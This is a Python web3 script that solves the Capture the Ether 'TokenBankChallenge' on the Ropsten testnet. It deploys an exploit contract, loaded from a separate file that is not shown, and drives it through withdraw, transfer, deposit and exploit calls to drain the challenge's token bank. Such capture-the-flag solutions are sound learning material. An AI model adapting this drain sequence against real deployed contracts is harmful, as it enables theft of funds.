from web3 import Web3
from config import CONFIG
from solcx import compile_source

w3 = Web3(Web3.HTTPProvider(CONFIG["INFURA_URL_ROPSTEN"]))

CHALLENGE_CONTRACT_ADDRESS = "0xd5Af2068E14F7a76E6452EC7c1AdD42a3eDaB232"

half_of_total_tokens = 500000 * 10**18

with open('CTE_Contracts/TokenBankChallenge.sol', 'r') as file:
    challenge_code = file.read()

compiled_challenge_code = compile_source(challenge_code, solc_version="0.4.21")
compilation_output = compiled_challenge_code["<stdin>:TokenBankChallenge"]
challenge_contract_abi = compilation_output["abi"]
challenge_contract = w3.eth.contract(address=CHALLENGE_CONTRACT_ADDRESS, abi=challenge_contract_abi)

compilation_output = compiled_challenge_code["<stdin>:SimpleERC223Token"]
token_contract_abi = compilation_output["abi"]
token_address = challenge_contract.functions.token().call()
token_contract = w3.eth.contract(address=token_address, abi=token_contract_abi)

with open('ExploitContracts/TokenBankExploit.sol', 'r') as file:
    exploit_contract_code = file.read()

compiled_exploit_code = compile_source(exploit_contract_code, solc_version="0.8.0")
compilation_output = compiled_exploit_code["<stdin>:TokenBankExploit"]
exploit_contract_abi = compilation_output["abi"]
exploit_contract_bytecode = compilation_output["bin"]

exploit_contract = w3.eth.contract(abi=exploit_contract_abi, bytecode=exploit_contract_bytecode)

construct_txn = exploit_contract.constructor(CHALLENGE_CONTRACT_ADDRESS).buildTransaction({
    "nonce": w3.eth.getTransactionCount(CONFIG["ADDRESS_1"]),
    "gas": 3000000,
    "gasPrice": w3.toWei('5', "gwei")
})
signed_tx = w3.eth.account.signTransaction(construct_txn, private_key=CONFIG["PRIVATE_KEY_1"])
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
print(w3.toHex(tx_hash))
receipt = w3.eth.waitForTransactionReceipt(tx_hash)

exploit_contract_instance = w3.eth.contract(address=receipt.contractAddress, abi=exploit_contract_abi)

tx = challenge_contract.functions.withdraw(half_of_total_tokens).buildTransaction({
    "nonce": w3.eth.getTransactionCount(CONFIG["ADDRESS_1"]),
    "gas": 3000000,
    "gasPrice": w3.toWei('5', "gwei")
})
signed_tx = w3.eth.account.signTransaction(tx, private_key=CONFIG["PRIVATE_KEY_1"])
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
receipt = w3.eth.waitForTransactionReceipt(tx_hash)

tx = token_contract.functions.transfer(exploit_contract_instance.address, half_of_total_tokens).buildTransaction({
    "nonce": w3.eth.getTransactionCount(CONFIG["ADDRESS_1"]),
    "gas": 3000000,
    "gasPrice": w3.toWei('5', "gwei")
})
signed_tx = w3.eth.account.signTransaction(tx, private_key=CONFIG["PRIVATE_KEY_1"])
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
receipt = w3.eth.waitForTransactionReceipt(tx_hash)

tx = exploit_contract_instance.functions.deposit().buildTransaction({
    "nonce": w3.eth.getTransactionCount(CONFIG["ADDRESS_1"]),
    "gas": 3000000,
    "gasPrice": w3.toWei('5', "gwei")
})
signed_tx = w3.eth.account.signTransaction(tx, private_key=CONFIG["PRIVATE_KEY_1"])
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
receipt = w3.eth.waitForTransactionReceipt(tx_hash)

tx = exploit_contract_instance.functions.exploit().buildTransaction({
    "nonce": w3.eth.getTransactionCount(CONFIG["ADDRESS_1"]),
    "gas": 3000000,
    "gasPrice": w3.toWei('5', "gwei")
})
signed_tx = w3.eth.account.signTransaction(tx, private_key=CONFIG["PRIVATE_KEY_1"])
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
receipt = w3.eth.waitForTransactionReceipt(tx_hash)

assert challenge_contract.functions.isComplete().call()